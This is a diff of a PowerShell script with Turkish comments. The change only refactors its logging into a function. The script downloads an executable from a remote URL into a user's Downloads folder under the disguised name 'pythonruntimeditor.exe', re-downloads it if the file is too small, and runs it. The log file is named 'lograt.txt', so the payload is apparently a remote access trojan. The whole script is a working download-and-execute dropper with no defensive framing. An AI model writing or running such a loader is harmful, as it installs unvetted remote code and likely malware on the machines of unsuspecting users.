@@ -14,11 +14,19 @@ $localPath = "C:\Users\dogud\Downloads\pythonruntimeditor.exe"
 
 # Log dosyasına yazılacak işlemler
 $logFile = "C:\Users\dogud\Downloads\lograt.txt"
-$log = { param($msg) Add-Content -Path $logFile -Value ("[$(Get-Date -Format 'HH:mm:ss')] $msg") }
+
+# Log fonksiyonunu tanımla
+function Log-Message {
+    param([string]$msg)
+    Add-Content -Path $logFile -Value ("[$(Get-Date -Format 'HH:mm:ss')] $msg")
+}
+
+# Loglama işlemleri
+Log-Message "Script başlatıldı."
 
 # Dosya indir ve kontrol et
 try {
-    $log "İndirme işlemi başlatılıyor..."
+    Log-Message "İndirme işlemi başlatılıyor..."
     
     # WebClient kullanarak dosya indir
     $client = New-Object System.Net.WebClient
@@ -29,16 +37,16 @@ try {
     $expectedSize = 46000  # 46 KB'lik dosya için beklenen boyut
 
     if ($fileSize -lt $expectedSize) {
-        $log "HATA: Dosya boyutu hatalı. Boyut: $fileSize byte. Yeniden indiriyorum..."
+        Log-Message "HATA: Dosya boyutu hatalı. Boyut: $fileSize byte. Yeniden indiriyorum..."
         Remove-Item $localPath -Force
         $client.DownloadFile($exeUrl, $localPath)  # Tekrar indir
     } else {
-        $log "Dosya başarıyla indirildi. Boyut: $fileSize byte"
+        Log-Message "Dosya başarıyla indirildi. Boyut: $fileSize byte"
     }
 
     # Dosyayı çalıştır
-    $log "Dosya çalıştırılıyor..."
+    Log-Message "Dosya çalıştırılıyor..."
     Start-Process -FilePath $localPath -WindowStyle Normal
 } catch {
-    $log "HATA: $($_.Exception.Message)"
+    Log-Message "HATA: $($_.Exception.Message)"
 }
